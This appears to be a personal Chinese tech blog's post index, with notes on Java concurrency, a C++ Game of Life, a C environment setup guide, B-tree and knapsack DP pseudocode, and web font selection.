作者是如何一步步改进程序并发性能的：1. 引入线程池 2. 引入 concurrentHashMap3. 将对竞争资源的访问转换成处理离线任务再合并。 问题 1 阅读 ForkJoinPool 文档 ——fork/join 框架和线程池区别？分别适用什么场景？ Fork/Join 框架是一个基于工作窃取算法的任务调度框架，而线程池则是用于执行一组线程任务的框架。具体来说，ForkJoinPool 线程池中的每一条线程都有一个自己的工作队列（WorkQueue），这个工作队列是双端队列，从自己队列的头部取得任务，从尾部添加任务，如果自己的队列中没有任务了，它又会去 “偷” 其他线程的任务。这一点就是工作窃取算法。 问题 2 什么是 countDownLatch 和 CyclicBarrier？ CountDownLatch 和 CyclicBarrier 都是 Java 中的多线程工具类。 CountDownLatch 是一个计数器，可以用来控制多个线程的并发执行。CountDownLatch 有一个计数值，调用一次 countDown () 方法计数器的值就会减 1，当计数器的值减为 0 时，表示所有线程都已经执行完毕，等待在 await () 方法上的线程就可以继续执行。 CyclicBarrier 也是一个计数器，但与 CountDownLatch 不同的是，CyclicBarrier 的计数值只能在初始化时设置，所有线程都到达后，它会释放所有等待的线程，并且将计数值重置为初始值。CyclicBarrier 适合需要多个线程协同完成某个任务的场景。 问题 3 Amdahl 定律是什么？ Amdahl 定律是一个公式，它描述了在添加更多处理器或核心时，计算机系统可以达到的理论最大性能加速比。它表明，系统的加速比将受到程序中无法并行化的部分的限制。换句话说，如果一个程序由可并行化和不可并行化部分组成，则即使增加更多处理器，不可并行化部分也会限制系统的整体加速比。 Amdahl 定律的公式为： 速度提升比 = 1 / (1 - P + P/N) 其中，P 是可并行化程序的部分比例，N 是处理器的数量，速度提升比是预期的性能改进。该公式假设问题规模保持不变，处理器之间没有通信或同步成本。 Amdahl 定律强调了识别和优化程序中无法并行化的关键部分的重要性，以实现在添加更多处理器时的最佳性能提升。 线程与锁模型最大的好处就是能被轻松集成到各种语言中，它本质上是将硬件工作形式化，而这也意味着它在语言层面其实并没有提供多大帮助，而且还容易带来不确定性的隐患。因为不确定，所以很难测试和复现问题。作者这里用赛车做了一个类比，如何从一堆废墟中找到问题，答案是完善数据记录。 一些好的并发编程建议：1. 访问共享变量时同步 2. 按照全局固定顺序来取锁 3. 持有锁时避免调用外星方法。","link":"/2023/05/21/concurrent-programming/"},{"title":"复现康威的生命游戏","text":"康威提出该游戏的原因 康威生命游戏（英语：Conway’s Game of Life），又称康威生命棋，是英国数学家约翰・何顿・康威在 1970 年发明的细胞自动机。它最初于 1970 年 10 月在《科学美国人》杂志上马丁・葛登能的 “数学游戏” 专栏出现。 康威生命游戏是图灵完备的，简单来说就是它能做到图灵机的一切。图灵机的一个显著特点是能够产生和读取无限个 “0” 和 “1”，且支持条件分支并拥有无限大的内存。 图灵机是对人用纸笔计算的一种行为抽象，每一步计算都需要阅读纸上的数学符号，再经过大脑思考后得到结果。为了实现图灵机，需要有这样几个东西，TAPE、HEAD、TABLE 还有一个状态寄存器。考虑有一条无限长的纸带 TAPE，里面写着连续的数学符号（空白的地方可以视作一个特殊符号），一个读写头 HEAD 能够读取数学符号和左右移动，以及一套有限的规则表 TABLE。这个 TABLE 能够根据当前状态寄存器和 HEAD 指向 TAPE 的当前数学符号来确定下一步的动作，具体来说是改变 TAPE 上的数学符号，移动 HEAD，改变当前状态。 康威的生命游戏规则 在康威的生命游戏中，整个世界是建立在一片无限细胞格子棋盘中的，它们只有死亡和存活两种状态。每个周期结束时都会对所有细胞进行存活判定，该判定取决于周围 8 个细胞的存活状态： 周围活细胞低于 2 个时，该细胞死亡（过于稀疏）。 周围活细胞为 2 个或者 3 个时，该细胞保持不变。 周围活细胞超过 3 个时，该细胞死亡（过于拥挤）。 周围活细胞刚好为 3 个时，死细胞复活（模拟繁殖）。 部分代码展示 游戏引擎： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138// Game.cpp#include &quot;Game.h&quot;using namespace sf;Game::Game(std::vector&lt;std::pair&lt;int, int&gt;&gt; initValue) { int width = initValue[0].first, height = initValue[0].second; map = BoardMap(width, height); for (size_t i = 1; i &lt; initValue.size(); i++) { int x = initValue[i].first, y = initValue[i].second; map.setBoxValue(x, y, true); }}void Game::next() { if (!isRun()) { return; } map = map.gotoNext();}bool Game::isRun() { return map.isEmpty();}void Game::draw(RenderWindow&amp; window) { int rows = map.getRows(); int cols = map.getCols(); window.clear(Color(234, 255, 208)); for (int i = 0; i &lt; rows; ++i) { for (int j = 0; j &lt; cols; ++j) { // 绘制格子 RectangleShape rectangle(Vector2f(CELL_SIZE, CELL_SIZE)); rectangle.setPosition(j * CELL_SIZE, i * CELL_SIZE); if (map.getBoxValue(i, j)) { rectangle.setFillColor(Color::White); // 白色格子 } else { rectangle.setFillColor(Color::Black); // 黑色格子 } // 绘制边框 RectangleShape border(Vector2f(CELL_SIZE, CELL_SIZE)); border.setPosition(j * CELL_SIZE, i * CELL_SIZE); border.setFillColor(Color::Transparent); // 边框内部透明 border.setOutlineThickness(1); // 设置边框厚度 border.setOutlineColor(Color(128, 128, 128)); // 灰色边框 window.draw(border); window.draw(rectangle); } } window.display();}void Game::run() { int rows = map.getRows(); int cols = map.getCols(); // 初始界面 RenderWindow window(VideoMode(1000, 1000), &quot;Board Map&quot;); draw(window); int week = 3; while (window.isOpen()) { Event event; while (window.pollEvent(event)) { if (event.type == Event::Closed) window.close(); // 处理键盘事件 if (event.type == Event::KeyPressed) { int rows = map.getRows(); int cols = map.getCols(); if (event.key.code == Keyboard::Space) { map = map.gotoNext(); } } circles ++; if (circles % week == 0) { // 检测上下左右 week 排如果有格子，则增加 map 大小 bool needExpand = false; int rows = map.getRows(); int cols = map.getCols(); for (int i = 0; !needExpand &amp;&amp; i &lt; week; i++) { for (int j = 0; j &lt; cols; j++) { if (map.getBoxValue(i, j)) { needExpand = true; std::cout &lt;&lt; &quot;(&quot; &lt;&lt; i &lt;&lt; &quot;,&quot; &lt;&lt; j &lt;&lt; &quot;) boo! &quot; &lt;&lt; std::endl; } } } for (int i = rows - week; !needExpand &amp;&amp; i &lt; rows; i++) { for (int j = 0; j &lt; cols; j++) { if (map.getBoxValue(i, j)) { needExpand = true; std::cout &lt;&lt; &quot;(&quot; &lt;&lt; i &lt;&lt; &quot;,&quot; &lt;&lt; j &lt;&lt; &quot;) boo! &quot; &lt;&lt; std::endl; } } } for (int j = 0; !needExpand &amp;&amp; j &lt; week; j++) { for (int i = 0; i &lt; rows; i++) { if (map.getBoxValue(i, j)) { needExpand = true; std::cout &lt;&lt; &quot;(&quot; &lt;&lt; i &lt;&lt; &quot;,&quot; &lt;&lt; j &lt;&lt; &quot;) boo! &quot; &lt;&lt; std::endl; } } } for (int j = cols - week; !needExpand &amp;&amp; j &lt; cols; j++) { for (int i = 0; i &lt; rows; i++) { if (map.getBoxValue(i, j)) { needExpand = true; } } } if (needExpand) { std::cout &lt;&lt; &quot;get a bigger size.&quot; &lt;&lt; std::endl;// std::cout &lt;&lt; &quot;==== BEFORE EXPAND ====&quot; &lt;&lt; std::endl;// for (int i = 0; i &lt; rows; ++i) {// for (int j = 0; j &lt; cols; ++j) {// std::cout &lt;&lt; map.getBoxValue(i, j) &lt;&lt; &quot; &quot;;// }// std::cout &lt;&lt; std::endl;// } map = map.expand(week);// std::cout &lt;&lt; &quot;==== AFTER EXPAND ====&quot; &lt;&lt; std::endl; rows = map.getRows(); cols = map.getCols(); // 重新调整窗口大小 window.create(VideoMode(cols * CELL_SIZE, rows * CELL_SIZE), &quot;Board Map&quot;); window.setSize(Vector2u(cols * CELL_SIZE, rows * CELL_SIZE)); // 打印更新后的地图状态（示例）// for (int i = 0; i &lt; rows; ++i) {// for (int j = 0; cols; ++j) {// std::cout &lt;&lt; map.getBoxValue(i, j) &lt;&lt; &quot; &quot;;// }// std::cout &lt;&lt; std::endl;// }// std::cout &lt;&lt; &quot;==== END EXPAND ====&quot; &lt;&lt; std::endl; } } } draw(window); // 调用绘制函数 }} 核心代码： 123456789101112131415161718192021222324252627BoardMap gotoNext() { if (isEmpty()) { return *this; } BoardMap newMap = BoardMap(rows, cols); for (int i = 1; i &lt; rows - 1; i++) { for (int j = 1; j &lt; cols - 1; j++) { int aliveNeighbor = countAliveNeighbor(*this, i, j); bool isAlive = getBoxValue(i, j); // 核心规则 if (aliveNeighbor &gt; 0) {// std::cout &lt;&lt; &quot;(&quot;&lt;&lt;i &lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;&quot;) owns &quot; &lt;&lt; aliveNeighbor &lt;&lt; &quot; alive neighbors.&quot;&lt;&lt; std::endl; } if (isAlive &amp;&amp; (aliveNeighbor &lt; 2 || aliveNeighbor &gt; 3)) {// std::cout &lt;&lt; &quot;(&quot;&lt;&lt;i &lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;&quot;) become death.&quot; &lt;&lt; std::endl; isAlive = false; } else if (!isAlive &amp;&amp; aliveNeighbor == 3) {// std::cout &lt;&lt; &quot;(&quot;&lt;&lt;i &lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;&quot;) become alive.&quot; &lt;&lt; std::endl; isAlive = true; } else if (isAlive) {// std::cout &lt;&lt; &quot;(&quot;&lt;&lt;i &lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;&quot;) keep alive.&quot; &lt;&lt; std::endl; } newMap.setBoxValue(i, j, isAlive); } } return newMap;} 六种结构体分类说明 静止生命 不随时间变化的模式称为静止模式或静物模式。 例如：蜂窝、灯笼、船只和浴缸。 振荡器 振荡器是随着时间循环的模式。 例如：闪光灯和齿轮。 飞船 飞船是自我复制并移动的模式。 例如：滑翔机和轻型飞船。 枪 枪是能不断产生新的物体的模式。 例如：Gosper 滑翔枪。 不属于上述 1~4 的全部 在经过有限个周期后从无序对象化作 1~4 中的任意对象 例如：模糊泡沫和伪泡沫。 无规则图案 一些图案不属于上述任何一种类别。 总结 康威的生命游戏以其简单的规则和复杂的行为而闻名。它展示了简单系统如何通过局部交互产生复杂的动态模式。本文提供了一些代码示例，并说明了康威生命游戏中的六种常见结构体。希望这篇文章能让你对康威生命游戏有更深入的了解，并激发你对细胞自动机和复杂系统的兴趣。","link":"/2024/07/04/convey-life-game-implement/"},{"title":"搭建 C 语言编程环境指南","text":"C 语言是一个经典且高效的编程语言，广泛应用于操作系统、嵌入式系统等开发中。本文将详细介绍如何在 Linux 环境下搭建一个 C 语言开发环境，包括编译器安装、代码编辑器设置、Git 全局配置、Zsh 快捷键优化等，帮助你快速上手 C 语言编程。 PS：后面放弃了，感觉C语言还是太无聊了。 1. 安装编译器 C 语言的编译器主要有 GCC 和 Clang，推荐安装 GCC 作为主要编译器。 1.1 安装 GCC 可以通过以下命令在 Ubuntu 系统上安装 GCC： 12sudo apt updatesudo apt install build-essential 检查安装是否成功： 1gcc --version 你应该看到类似以下的输出，说明 GCC 安装成功： 1gcc (Ubuntu 9.3.0-10ubuntu2) 9.3.0 1.2 安装 Clang（可选） 如果你想使用 Clang 编译器，也可以通过以下命令安装： 1sudo apt install clang 之后同样可以通过 clang --version 来检查安装情况。 2. 设置 VPN 代理（可选） 如果你需要通过 VPN 访问外网，可以在虚拟机中设置 VPN 代理，以下是设置 VPN 的基础步骤： 2.1 配置 HTTP 和 HTTPS 代理 在终端中设置 HTTP 和 HTTPS 代理： 12export http_proxy=http://192.168.168.1:1080/export https_proxy=http://192.168.168.1:1080/ 使用 curl 测试代理是否生效： 1curl www.google.com 更多关于 VPN 配置的内容可以参考这篇教程。 3. 配置代码编辑器 为了提高编码效率，你可以使用文本编辑器的插件和自动格式化工具。推荐使用 Clang-Format 来保持代码风格一致。 3.1 安装并配置 Clang-Format 使用 Clang-Format 格式化代码，首先确保已安装： 1sudo apt install clang-format 然后通过在线配置工具生成配置文件，或者使用以下配置作为起点： 123456789BasedOnStyle: LLVMIndentWidth: 4ColumnLimit: 100SpaceAfterCStyleCast: trueUseTab: NeverAlignTrailingComments: trueBreakBeforeBraces: AllmanBraceWrapping: AfterControlStatement: true 将上述内容保存为 .clang-format 文件，放置于项目根目录，之后在代码编写完成后运行： 1clang-format -i *.c 这将自动格式化所有的 .c 文件。 4. Git 配置 全局设置 Git 可以帮助你在不同的项目中保持一致的用户信息和提交规范。 4.1 设置全局用户名和邮箱 使用以下命令设置 Git 的用户名和邮箱： 12git config --global user.name &quot;huangzining&quot;git config --global user.email &quot;21210240206@m.fudan.edu.cn&quot; 之后你可以运行 git config --list 来检查配置是否正确。 5. 优化 Zsh 命令行 Zsh 是一个强大的 Shell，可以通过配置快捷键来提升工作效率。 5.1 配置 Home 和 End 键 在 Zsh 中可以通过 bindkey 命令绑定快捷键。例如，绑定 Home 和 End 键以便快速跳转到行首和行尾： 12bindkey '\\e[1~' beginning-of-linebindkey '\\e[4~' end-of-line 要使这些配置生效，你可以将它们添加到 .zshrc 文件中。 5.2 配置常用快捷键 同样的，你可以为删除键（Delete）、PgUp 和 PgDn 等常用按键绑定功能： 123bindkey '\\e[3~' delete-charbindkey '\\e[6~' end-of-historybindkey '\\e[5~' insert-last-word 更多关于 Zsh 配置的内容可以参考这篇文章。 6. 常用插件和工具 在日常开发中，除了基础的编译器和编辑器配置，Git 插件也是非常有用的工具。你可以考虑在 Git 提交时自动格式化代码、生成 changelog 或通过插件增强 Git 的交互性。 6.1 安装 Git 插件 安装 Git 插件来提升开发效率，如 Git commit 插件。根据你的工作流程，可以搜索相关插件并进行配置。 结论 通过以上步骤，你已经完成了基本的 C 语言开发环境搭建。从编译器安装到环境变量配置，再到编辑器和 Shell 的优化设置，这些都能帮助你在 C 语言的开发过程中更加高效。接下来，你可以根据自己的需求进行更多个性化的配置，开始你的 C 语言项目吧！","link":"/2024/10/01/cs-c-deploy/"},{"title":"B 树","text":"探讨 B 树和其变种的数据结构，比如 B 树、B+ 树、红黑树等。 起源 B 树是一种平衡搜索树，类似红黑树，但拥有更多孩子节点，这使得 B 树的高度要比红黑树小很多。因此，B 树可以在 $O (lg n)$ 时间内完成操作。许多数据库如 MySQL 就采用 B 树或其变种 B+ 树来存储信息，从而降低磁盘等辅存的 I/O 操作数。 磁盘作为辅存，区别于主存（对应内存条），是无法随机访问的，而 B 树则是专为这类无法随机访问的设备构造的数据结构。当然，随着 SSD 的大跳水，B 树也将会向着 LSM 树慢慢过渡。 硬盘或者说磁盘驱动器是由多个盘片组成的，每个盘片表面又有多个磁道，因此每次硬盘存取时间都不一样，它取决于当前磁道和所需磁道之间的距离以及初始旋转状态。不过，为了方便估计我们一般采用读写的页数来做磁盘存取时间的近似。 言归正传，由于 B 树的操作时间通常由磁盘读写时间来决定，因此我们通常将 B 树的结点设计和一个完整磁盘页一样大小。结点大小又进而限制了一个结点包含孩子个数的上限，通常是 50 ~ 2000 之间，这还取决于关键字大小。一个体现这种设计的只管例子如下，一棵结点上限为 1000 的 B 树，存储十亿个结点，高度却仅为 2。 B 树的定义 B 树和二叉搜索树、红黑树一样，将和关键字相关联的 “卫星数据” 同关键字一起放在同一结点中。当然，它一般是指针的形式，指向另一个磁盘页。之所以强调前一句，是因为一个常见的 B 树变种 B+ 树是将所有 “卫星数据” 都存储在叶子结点中的，内部仅保存关键字和孩子结点。 根据 Donald Knuth 的定义，B 树是这样一棵有根树： 每个结点 x 有以下属性： x.n，当前存储在 x 中的结点个数。 x.n 个关键字本身，以非降序排列。 x.leaf，一个判定当前是否为叶子结点的布尔值。 每个内部结点还包含 x.n + 1 个指向孩子结点的指针。 每个关键字会对左右子树的关键字范围做切割限定。 每个叶子结点具有相同深度。 每个结点包含的关键字个数有上界和下届，用一个固定整数 “最小度数” t &gt;= 2 去定义这些界： 除了根结点以外的每个结点必须有至少 t - 1 个关键字。 每个结点至多包含 2t - 1 个关键字。 当 t = 2 时的 B 树是最简单的，每个结点只有 2、3、4 个孩子，即一棵 2-3-4 树。当然，我们之前也谈过了，通常这个值在 50 ~ 2000 之间。另外，根结点的关键字没有限制这一特性，跟结点插入算法为向上传播有关。 “前人栽树，后人乘凉”，任何时候都没法平地起高楼的，B 树的诞生本身也参考了 2-3 树和 2-3-4 树。B 树起源于二叉搜索树，由波音研究所的两名科学家 Rudolf Bayer 和 Edward M. McCreight 发明（1970s），应用于数据库和文件系统。B 树的 B 其实包含了多重意思，比如波音，而不是我们通常简单认为的 Balance 平衡。 2-3 tree 一棵 2-3 树由 2-node 节点或 3-node 节点构成，由 John Hopcroft 于 1970 年发明。 为了保持平衡，2-3 树的所有叶节点放在同一层，节点元素值也是有序排放的。 2-3-4 tree 由 2-3 树推广，2-3-4 树的内部节点还包含 4-node 节点。 同样为了保持平衡，2-3-4 树所有叶节点也放在同一层，节点元素内部有序排列。 值的注意的是，2-3-4 树其实可以看作一棵 4 阶 B 树。 基本操作 搜索 B 树 过程和二叉搜索树类似，不断从根结点向下访问即可： 1234567891011def B_TREE_SEARCH(x, k): i = 1 while i &lt;= x.n and k &gt; x.key: i += 1 if i &lt;= x.n and k == x.key: return (x, i) elif x.leaf: return None else: DISK_READ(x, x.c[i]) return B_TREE_SEARCH(x.c[i], k) 创建一棵空的 B 树 123456def B_TREE_CREATE(T): x = ALLOCATE_NODE() x.leaf = True x.n = 0 DISK_WRITE(x) T.root = x 向 B 树插入一个关键字 在 B 树中插入结点并不简单，由于不能将关键字插入一个满的结点，因此引入一个操作 ——“分裂”。分裂操作将一个满的包含 2t - 1 个关键的结点按中间关键分裂成两个包含 t - 1 个关键字的结点，而中间关键字则被提到父结点中，这是一个向上传播过程。为了将过程简化，我们在插入过程中会主动分裂满结点，从而将 “向上” 这一过程绕开。 123456789101112131415161718192021def B_TREE_SPLIT_CHILD(x, i): z = ALLOCATE_NODE() y = x.c[i] z.leaf = y.leaf z.n = t - 1 for j in range(1, t): z.key[j] = y.key[j + t] if not y.leaf: for j in range(1, t + 1): z.c[j] = y.c[j + 1] y.n = t - 1 for j in range(x.n + 1, i, -1): x.c[j + 1] = x.c[j] x.c[i + 1] = z for j in range(x.n, i - 1, -1): x.key[j + 1] = x.key[j] x.key[i] = y.key[t] x.n = x.n + 1 DISK_WRITE(y) DISK_WRITE(z) DISK_WRITE(x) 对根结点进行分裂是增加 B 树高度的唯一途径，有了上面的分裂动作，我们的插入操作也变容易起来，只需要沿树单向下行即可： 1234567891011121314151617181920212223242526272829303132def B_TREE_INSERT(T, k): r = T.root if r.n == 2*t - 1: s = ALLOCATE_NODE() T.root = s s.leaf = False s.n = 0 s.c[1] = r B_TREE_SPLIT_CHILD(s, 1) B_TREE_INSERT_NONFULL(s, k) else: B_TREE_INSERT_NONFULL(r, k)def B_TREE_INSERT_NONFULL(x, k): i = x.n if x.leaf: while i &gt;= 1 and k &lt; x.key[i]: x.key[i + 1] = x.key[i] i = i - 1 x.key[i + 1] = k x.n = x.n + 1 DISK_WRITE(x) else: while i &gt;= 1 and k &lt; x.key[i]: i = i - 1 i = i + 1 DISK_READ(x.c[i]) if x.c[i].n == 2*t - 1: B_TREE_SPLIT_CHILD(x, i) if k &gt; x.key[i]: i = i + 1 B_TREE_INSERT_NONFULL(x.c[i], k) 对于一棵高度为 h 的 B 树来说，B_TREE_INSERT 要做 $O (h)$ 次磁盘存取，因为每一层只做了 $O (1)$ 次 DISK_WRITE 和 DISK_READ 操作。 删除 删除的逻辑简述如下： 如果关键字 k 在结点 x 中，并且 x 是一个叶子结点，则从 x 中删除 k 即可 如果关键字 k 在结点 x 中，并且 x 是一个内部结点，则： x 中前于 k 的子节点 y 至少包含 t 个关键字，则找到 k 在 y 中的前驱 k’，递归地删除 k’，并在 x 中用 k’ 去替换 k。 对称的，如果前于 k 的子结点 y 只有 t - 1 个关键字，那么则找后于 k 的子结点 z。 如果 y 和 z 都只有 t - 1 个关键字，则将 k 和 z 都合并到 y 中，再递归删除 y 中的 k 关键字。 如果关键字 k 不在结点 x 中，则先确定一个必定包含 k 的子树的根 x.c[i]。如果 x.c[i] 只有 t - 1 个关键字，则： 如果 x.c[i] 的相邻兄弟包含至少 t 个关键字，则 x 中对应的那个关键字下沉到 x.c[i] 中， 而将相邻兄弟的一个关键字提到 x 中。 如果两个相邻兄弟都只有 t - 1 个关键字，则将 x.c[i] 和一个兄弟合并，再递归删除 k 关键字。 实现数据库索引 我们的数据库一般都放在磁盘上，而从磁盘上读取一条记录的时间大约是 10 毫秒，假设我们从一百万条数据中找到一条记录，即使用二分法也要访存 20 次即 0.2 秒。当然由于我们访存时会按块存取，而一个块可能包含连续一百条记录，这样后续的几次比较实际上并不需要访存。因此，访存时间缩短为 0.14 秒左右。 有利自然有弊，虽然我们访问记录的速度快了，但维护这样一个有序结构也变得麻烦起来。因此，当我们删除时，我们只是将其标记为已删除而暂时不动它，等访问效率降低到一定程度后再整理。同理，插入时，我们直接替换掉那些已删除的元素。而为了让删除和插入的代价尽量小，我们也需要尽量让 B 树维持在一个半满的状态。 这时候，采用 B 树作为数据库索引结构意义出现了。假设我们构建一个 100 阶的 B 树，并让它保存_一百万条数据，那么我们访问一条记录只需要 3 次_，也就是 0.03 秒。 B 树用在数据库有这样几点优势： 有序存储键值，便于顺序遍历。 使用分层索引，最大限度地减少磁盘读取次数。 使用部分填充块来加快插入和删除的速度。 通过递归算法保持索引平衡。 此外，B 树通过确保内部节点至少半满，最小化浪费，B 树能够处理任意数量的插入和删除操作。 衍生数据结构 B+ Tree MySQL 的 InnoDB 采用 B + 树存储索引，相较于 B 树，由于元素都放到了叶子节点所以树会变矮查询速度变快，另一方面 B + 树的叶子节点是有序串联的，因此范围查询起来也比较方便。 红黑树 Red–black Tree 红黑树是由 Leonidas J. Guibas 和 Robert Sedgewick 在 2-3-4 树上发展而来，增删查改节点的时间都是 $O (log n)$。 红黑树保证根和叶子节点都是黑色，红色节点不相邻，且任意路径的黑色节点数相等，这使得最长路径和最短路径只有两倍差。 跳表 Skip list 跳表是一个概率数据结构，最大亮点是能够以 ${\\mathcal {O}}(\\log n)$ 复杂进行查询和增删。它实现快速查询的原理其实很简单，在维持更少元素的子序列上查找即可，这样就能跳过非目标的元素了。","link":"/2023/04/01/data-structure-btree/"},{"title":"背包 DP","text":"背包问题探讨了如何用有限背包去装入尽可能多或者尽可能贵的物品，或者说用有限空间换取最大价值的问题。当然，问题是多样化的，我们需要将问题中涉及到的资源抽象对应到背包的空间和价值两个维度上。 01 背包 有 N 件物品和一个容量为 V 的背包，放入第 i 件物品会消耗 ci，获得价值 wi，而 01 背包问题的特点是每种物品有且仅有一件。其状态转移方程为： 1F[i,v] = max {F[i-1, v], F[i-1, v - c_i] + w_i} 根据上面的转移方程可以写出如下代码（网上随意 copy 了一份，看看思路即可），每当遇到一个新的物品，判断加入它到背包是否能让之前的收纳规划优化： 12345678910111213141516n, v = map(int, input().split())goods = []for i in range(n): goods.append([int(i) for i in input().split()])# 初始化，先全部赋值为 0，这样至少体积为 0 或者不选任何物品的时候是满足要求 dp = [[0 for i in range(v+1)] for j in range(n+1)]for i in range(1, n+1): for j in range(1,v+1): dp[i][j] = dp[i-1][j] # 第 i 个物品不选 if j&gt;=goods[i-1][0]: # 判断背包容量是不是大于第 i 件物品的体积 # 在选和不选的情况中选出最大值 dp[i][j] = max(dp[i][j], dp[i-1][j-goods[i-1][0]]+goods[i-1][1])print(dp[-1][-1]) 而将上述代码优化后可以得到： 123456dp = [0] * (N + 1)for i in range(1, N+1): c, w = goods[i][0], goods[i][1] for j in range(V, c-1, -1): dp[j] = max(dp[j], dp[j - c]+w) 完全背包 即将 01 背包问题的条件修改为每种物品有无穷件，其状态转换方程为： $$ F [i,v] = max \\{ F [i-1,v], F [i,v-c_i]+w_i \\} $$ 注意和前一个转换方程对比，不难发现，其区别的关键点在于，** 我们在完全背包考虑加入一件物品时，之前可能已经加入过无数件它的复制品了，而 01 背包时则从没加入过该物品。** 分析后，不难得到代码如下： 123456dp = [0] * (n + 1)for i in range(1, N+1): c, w = goods[i][0], goods[i][1] for j in range(c, V+1): dp[j] = max(dp[j], dp[j - c]+w) 另外一种解决完全背包问题的思路是，虽然每种物品都是无限的，但在有限容量的限制下，我们最多只能取 $\\lfloor V/c_i \\rfloor$ 件，因此可以转换为 01 背包问题。更近一步，可以用二进制优化。 多重背包 即将 01 背包问题的条件修改为每种物品有若干件，其状态转换方程为： $$ F [i,v] = max \\{ F [i-1,v], F [i-1,v-k \\times c_i]+k \\times w_i|0&lt;=k&lt;=M_i \\} $$ 对于 $M_i$ 件第 i 种物品，我们考虑用二进制的方法将其转换为 01 背包问题，令这些系数分别为 $1,2,2^2 …2^{k-1},M_i−2^k+1$，比如 13 可以被分为 1,2,4,6 四件物品。 总的来说，面对背包问题，首先状态转换方程，即思考前 i-1 件物品满足某种情况后，面对第 i 件物品，我们应该如何去优化我们规划。 分组背包 同样由 01 背包的背景而来，N 个物品被划分成了 K 组，同一组的物品最多只能选择一件。此时，我们的思考方式变成了，每当新的一组物品，我们选本组中最大的一件或者一件都不选，有状态方程： $$ F[i,v] = max\\{F[k-1,v], F[k-1,v-c_i]+w_i|item\\ i \\in group\\ K\\} $$ 优化后的伪代码如下： 三重循环不可随意更替，内部第二重循环的逆序是因为在第三重循环会更新 $F [v]$ 的值，而优化时只能在 $i-1$ 的基础上优化。 参考资料 【 1 】 崔添翼的 背包九讲 【 2 】 三叶 LeetCode 的 背包 DP 子栏","link":"/2022/12/06/dp-pack/"},{"title":"如何选择你的字体","text":"当我在配置博客网站时，常常对字体、字号产生选择困难症，而我又想让中英文混编时能够合理搭配，不仅如此我还会在正文中插入代码，这又需要另行考量。因此，我特地去查询了相关资料，去了解无衬线字体、衬线字体的发展历史，顺带看了下各种编码格式，并整理成文。 当然，最后的结果是令人欣喜的，至少我的阅读体验有大幅度提升。我也希望从旁人视角能够感受到本博客主人的认真、严谨的态度，不会因为内容之外的东西而被误读为文字垃圾制造者。 中文字体分类 中文字体本身有楷体、宋体、仿宋、黑体和圆体等区分，但在计算机中我们一般就参考英文字体分类方式，继续按衬线、无衬线、艺术字、手写体和等宽体区分即可。为什么不参考传统方式呢？因为在我看来，中国并无特殊地方，中文也并无特殊地方，对于文字这类交流工具，统一、规范才是我们第一需要参考的，其次是美观。何谓美观？优雅律动符合数学之道，而不是动不动嚷嚷着两千年如何如何。旧不如新也是必然的，中文字体的选择太少我想跟太循规蹈矩脱不了干系。 宋体就是一种典型的衬线字体，而黑体则是一种典型的非衬线字体，在电子阅读体验上我更喜欢后者，即使长时间阅读也不会很累，但前者会让我望而生畏，没有阅读的欲望。 中文字体的选择 首先我们可以确定的是，一种字体的诞生绝不是没来由的。别人花费了大量功夫去设计创造一个新的字体，必然是因为他洞察到了主流字体的缺陷，像宋体便脱胎自木板印刷，为了顺应木头纹理而成。那我接触到的中文字体，印象比较深刻的有上首可乐体，方正喵呜体，它们在广告或插图中效果很好，添了点活泼、俏皮的味道在里头。你如果将它们换成传统的黑体、楷体，就会让人很出戏，格格不入。 衬线字体、无衬线字体和等宽字体 简单来说，衬线字体 Serif 和 无衬线字体 Sans Serif 的区别就是字的结束点有没有用衬线修饰。如上图，我们其实很容易区分二者，其中 sans 在拉丁文中意为 without。 等宽字体 Monospace，如其名字所言，字符都是等宽的，通常用于计算机。我们在编写代码的时候会考虑这类字体，你可以去 Typewolf 找到你青睐的伙伴。身为一个程序员，除了编程，我们其实还会花费大量时间在高亮、别名、图标以及最简单也是最重要的 —— 字体选择上。程序员们总喜欢会花费大量时间讨论 Hack 和 Source Code Pro 谁更好看，类似于讨论编程语言谁更好，本人也乐在其中，并且喜新厌旧。 中英文混编 我看了很多中英文字体，感觉组合搭配都挺多，个人比较钟意于 Merriweather 和 Noto Sans SC，当然等宽字体我选择 Azeret Mono。 这里给一个参考：fontcdn('Merriweather:wght@400;700&amp;family=Noto+Sans+SC:wght@400;700&amp;family=Azeret+Mono:wght@400;700&amp;display=swap', 'css2') 其他选择 就阅读体验来说，电脑和书本是很不一样的，像经典的红头文件这种办公用纸基本都是仿宋体 GB2312，看到就一股子官僚气，如果有人在网页上也统统用这种字体就会让读者感到很无聊。作为一个读者而言，我的阅读和设备、系统、浏览器有关。我用的显示器是 AOC 的 U27P2C，当时主要考虑了两个属性，一个是 4k 屏幕，另一个是 Type-C 反充。我使用的浏览器是 Chrome 和 Firefox，会将网页放大到 125% 乃至 133%，浏览器本身也需要你为衬线和无衬线分别选择一款字体。Mac 的阅读体验会优于 Windows，这是一种直观感受，但我没有去深究原因。 font-family font-family 本身是一个 CSS 的属性，用来定义选定元素的字体。由于很多时候，用户的浏览器并没有网页原本指定的字体，那么 font-family 允许你定义一个由字体和字族构成序列，让浏览器能够挨个查询是否可用。那为了兜底，保证至少有一个字体可用，你应该在末尾加上一个通用字族，比如 sans serif、serif 甚至 monospace（有的浏览器只支持区分前两者）。 理解了上面的概念，一种简单的中英文混编方法就诞生了，我们可以将一个纯英文字体放到前面，而将中文字体置后，这样浏览器就会使用不同字体去渲染中文和洋文了。 另外，有时候我们特别想使用一个字体来展示我们的页面，但恰好这个字体又不是计算机系统内置的，这时候该怎么办呢？我们可以通过 CDN 的方式引入字体，让浏览器在加载页面前下载该字体。 PPI PPI 指像素密度，本意是指每英寸像素点数，类似的 DPI 指印刷墨水点数。两个参数都和清晰度相关，可以到 atoolbox 查询本机的 PPI，比如我的 27 英寸 4k 屏计算后得到 163 像素密度，理论上来说 300 PPI 是比较好的，因此我将系统设置缩放 150% 来获得更好的视觉体验。","link":"/2023/04/27/font-style/"},{"title":"函数式编程和模块化","text":"本文涉及项目源于张天戈老师的高级软件开发技术课设，语言使用 Typescript，任务是对论文 Why Functional Programming Matters，中间有反复参考函数式编程的 术语 和 Typescript 的 文档。 这篇论文年代久远（据闻是 1984 年！），当时的 John Hughes 